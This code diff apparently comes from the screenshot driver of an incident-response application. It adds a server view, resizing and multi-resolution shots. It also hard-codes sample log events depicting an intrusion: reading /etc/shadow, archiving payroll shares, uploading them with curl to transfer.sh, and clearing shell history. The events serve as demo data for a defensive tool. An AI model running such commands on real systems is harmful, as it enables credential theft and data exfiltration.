@@ -6,6 +6,7 @@
 #include "../src/crypto.HC"
 #include "../src/link.HC"
 #include "../src/log.HC"
+#include "../src/events.HC"
 #include "../src/station.HC"
 #include "../src/team.HC"
 #include "../src/deadlines.HC"
@@ -15,6 +16,27 @@
 
 extern "c" I32 system(U8 *command);
 extern "c" I32 setenv(U8 *name, U8 *value, I32 overwrite);
+extern "c" U0 SDL_SetWindowSize(U0 *window, I32 w, I32 h);
+
+U8 *g_events[11] = {
+  "shell|dana|ws-dana|ls -la /srv/shares",
+  "login|marcus|fs-01|ssh from 10.0.4.22",
+  "shell|marcus|fs-01|df -h /srv",
+  "fail|admin|fs-01|ssh password from 185.220.101.7",
+  "fail|admin|fs-01|ssh password from 185.220.101.7",
+  "login|svc-backup|fs-01|ssh from 185.220.101.7",
+  "sudo|svc-backup|fs-01|cat /etc/shadow",
+  "shell|svc-backup|fs-01|tar czf /tmp/.p.tgz /srv/shares/payroll",
+  "shell|svc-backup|fs-01|curl -T /tmp/.p.tgz https://transfer.sh/p.tgz",
+  "request|-|fs-01|GET /.env 404 from 185.220.101.7",
+  "shell|svc-backup|fs-01|history -c"
+};
+
+U0 Resize(App *a, I64 w, I64 h)
+{
+  SDL_SetWindowSize(a->cv->window, w, h);
+  CanvasResize(a->cv);
+}
 
 U0 Note(App *a, I64 kind, I64 phase, U8 *text)
 {
@@ -64,6 +86,12 @@ I32 Main(I32 argc, U8 **argv)
   Note(a, KIND_SCOPE, PHASE_CONTAIN, "NAS-02|OTHER|-|0|CLEAN");
   Note(a, KIND_NOTE, PHASE_CONTAIN, "Carrier confirmed coverage; forensic firm statement of work signed. Claim number A-55102.");
   Note(a, KIND_CHAT, PHASE_CONTAIN, "Draft EU notice sent to Priya for review. Need the imaging-archive count confirmed by 16:00.");
+  I64 picked = -1;
+  for (I64 i = 0; i < 11; i++) {
+    if (i == 6)
+      picked = a->st->log->count;
+    Note(a, KIND_EVENT, PHASE_CONTAIN, g_events[i]);
+  }
   Free(msg);
 
   a->team.peer_count = 1;
@@ -74,7 +102,7 @@ I32 Main(I32 argc, U8 **argv)
   MemSet(a->team.join_pk, 9, PK_BYTES);
   StrCpy(a->team.join_name, "Priya Shah");
 
-  U8 *names[VIEWS] = {"overview", "log", "scope", "clocks", "team", "network", "guide"};
+  U8 *names[VIEWS] = {"overview", "server", "log", "scope", "clocks", "team", "network", "guide"};
   for (I64 v = 0; v < VIEWS; v++) {
     a->view = v;
     Shot(a, names[v]);
@@ -119,6 +147,20 @@ I32 Main(I32 argc, U8 **argv)
   StrCpy(a->fields[FLD_SEARCH].text, "fs-01");
   a->fields[FLD_SEARCH].len = 5;
   Shot(a, "log-search");
+  a->fields[FLD_SEARCH].len = 0;
+  a->fields[FLD_SEARCH].text[0] = 0;
+  a->focus = -1;
+  a->view = V_SERVER;
+  a->selected = picked;
+  Shot(a, "server-picked");
+  Resize(a, 1366, 768);
+  a->view = V_OVERVIEW;
+  Shot(a, "small-overview");
+  Resize(a, 2560, 1440);
+  a->view = V_SERVER;
+  Shot(a, "big-server");
+  Resize(a, 1920, 1080);
+  Shot(a, "fhd-server");
   "rendered\n";
   return 0;
 }
